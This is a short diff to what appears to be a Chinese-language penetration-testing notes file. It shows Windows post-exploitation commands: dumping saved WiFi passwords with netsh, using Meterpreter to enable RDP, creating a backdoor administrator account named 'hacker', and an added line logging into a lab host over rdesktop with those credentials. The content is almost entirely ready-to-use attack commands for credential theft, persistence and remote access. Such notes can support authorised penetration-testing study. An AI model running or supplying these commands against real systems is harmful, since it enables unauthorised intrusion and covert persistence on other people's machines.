@@ -115,7 +115,7 @@ netsh wlan show profile name="ssid" KEY=clear
 
 windows 控制台cmd乱码的解决办法 chcp 65001
 
-
+开启远程桌面的办法
 ```cs
 getuid
 #如果当前是user权限要管理员权限才能开启3389
@@ -130,6 +130,8 @@ run post/windows/manage/enable_rdp
 net user hacker 123qwe.. /add
 #将用户提升到管理员权限
 net localgroup administrators hacker /add
+
+rdesktop -u hacker -p 123qwe..  192.168.1.145
 ```
 
 
